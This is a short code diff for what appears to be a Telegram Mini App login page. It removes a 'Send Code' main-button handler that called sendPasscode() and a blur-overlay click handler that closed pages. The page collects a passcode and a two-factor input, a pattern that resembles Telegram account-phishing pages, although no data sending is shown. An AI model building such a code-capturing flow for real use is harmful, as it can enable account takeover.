@@ -15,12 +15,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const passcodeBtn = document.getElementById('passcode-btn');
     const passcodeInput = document.getElementById('hiddenInput');
     const twofactorInput = document.getElementById('twofactor-input');
-    tg.MainButton.text = "Send Code";
-    tg.MainButton.show();
-    tg.MainButton.onClick(() => {
-    sendPasscode();
-    showPage3();
-    });
 
     document.addEventListener('touchstart', (e) => {
     const active = document.activeElement;
@@ -97,28 +91,6 @@ document.addEventListener('DOMContentLoaded', () => {
         page3.style.zIndex = '100';
         blur.style.opacity = '1';
     }
-
-    blur.addEventListener('click', () => {
-        if (page === 'page2') {
-            blur.style.zIndex = '-1';
-            page2.style.display = 'none';
-            blur.style.opacity = '0';
-            loginBtn.style.display = 'flex';
-            page = 'page1';
-            requestAnimationFrame(() => {
-                page2.style.transform = 'translateY(40px)';
-            });
-        } else if (page === 'page3') {
-            blur.style.zIndex = '-1';
-            page3.style.display = 'none';
-            blur.style.opacity = '0';
-            loginBtn.style.display = 'flex';
-            page = 'page1';
-            requestAnimationFrame(() => {
-                page3.style.transform = 'translateY(40px)';
-            });
-        }
-    });
 
     // Handle passcode submission
     passcodeBtn.addEventListener('click', async () => {
